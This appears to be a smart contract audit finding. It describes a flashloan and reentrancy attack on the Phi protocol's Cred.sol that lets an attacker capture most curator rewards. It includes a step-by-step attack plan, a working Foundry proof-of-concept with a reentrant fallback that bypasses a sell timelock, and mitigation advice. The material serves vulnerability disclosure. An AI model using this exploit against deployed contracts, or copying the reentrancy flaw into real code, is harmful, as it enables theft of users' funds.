# Vulnerability details

## Impact
Malicious user can use flashloan attack and re-entrancy attack in the Cred.sol contract to steal majority of the PhiRewards.

## Proof of Concept
When the distribute() function is called curators receive rewards shares based on the number of shares they have for a given cred ID, A malicious user can increase his shares number by taking a flashloan and buying majority of the shares for that cred and in the same transaction the malicious can take the PhiRewards and sold his cred shares. Even though there is a 10 minutes timelock guard for selling the cred shares but it can be bypassed with re-entrancy attack, as the timestamp tracking variable is updated after ETH transfer.

Step By Step Guide on the Attack idea:
1. Suppose some reward is deposited for credID 1 and user1 have 1 share for this cred and user2 have 2 shares for this cred.
2. Now a malicious user take a flashLoan from external source and purchase 200 shares for this credID with some extra ETH from the price+fees so that this excess will be transefered back to the msg.sender.
3. As the excess ETH transfer is happening before updating the `lastTradeTimestamp` , the malicious user can write the fallback function to call `CuratorRewardsDistributor.sol#distribute()` to get the majority reward first as he has majority of the cred shares and then he can sell the cred shares and also withdraw the reward ETH to repay the flashloan and the remainder will be the profit.

Here is a test case to check that the malicious user can buy the shares and bypassing the timelock check he can sell it in the same transactions:
(Save this into the CuratorRewardsDistributor.t.sol file and run: `forge test --mt testStealReward -vvv` )

```solidity
    uint x;
       
    function testStealReward() public {
        uint256 credId = 1;
        uint256 depositAmount = 1 ether;

        // Deposit some ETH to the curatorRewardsDistributor
        curatorRewardsDistributor.deposit{ value: depositAmount }(credId, depositAmount);
        console2.log(curatorRewardsDistributor.balanceOf(credId));
        // Signal creds for different users
        vm.startPrank(user1);
        vm.deal(user1, bondingCurve.getBuyPriceAfterFee(credId, 1, 1));
        cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 1, 1) }(credId, 1, 0);
        vm.stopPrank();

        vm.startPrank(user2);
        vm.deal(user2, bondingCurve.getBuyPriceAfterFee(credId, 2, 2));
        cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 2, 2) }(credId, 2, 0);
        vm.stopPrank();

        // Record initial balances
        uint256 initialUser1Balance = phiRewards.balanceOf(user1);
        uint256 initialUser2Balance = phiRewards.balanceOf(user2);
        console2.log("User1 Initial Reward Balance:", initialUser1Balance);
        console2.log("User2 Initial Reward Balance :", initialUser2Balance);
        console2.log("Malicious User Initial Reward Balance:", phiRewards.balanceOf(address(this)));


        vm.deal(address(this), cred.getCredBuyPriceWithFee(credId, 200) + 1 ether);
        cred.buyShareCred{ value: (cred.getCredBuyPriceWithFee(credId, 200) + 1 ether) }(credId, 200, 0);
        

        // Check final balances
        uint256 finalUser1Balance = phiRewards.balanceOf(user1);
        uint256 finalUser2Balance = phiRewards.balanceOf(user2);
        console2.log("User1 Final Reward Balance:", finalUser1Balance);
        console2.log("User2 Final Reward Balance:", finalUser2Balance);
        console2.log("Malicious User Final Reward Balance:", phiRewards.balanceOf(address(this)));

    }

    fallback() external payable {
        if (x == 0) {
            x = 1;
            uint256 credId = 1;
            curatorRewardsDistributor.distribute(credId);
            cred.sellShareCred(credId, 200, 0);
            console2.log("Successfully sold the creds, Current cred balance:", cred.getShareNumber(credId, address(this)));
        }
    }
```

## Tools Used
Foundry

## Recommended Mitigation Steps
Update the `lastTradeTimestamp` before transferring the excess with also add nonReentrant modifier in buy and sell shares functions
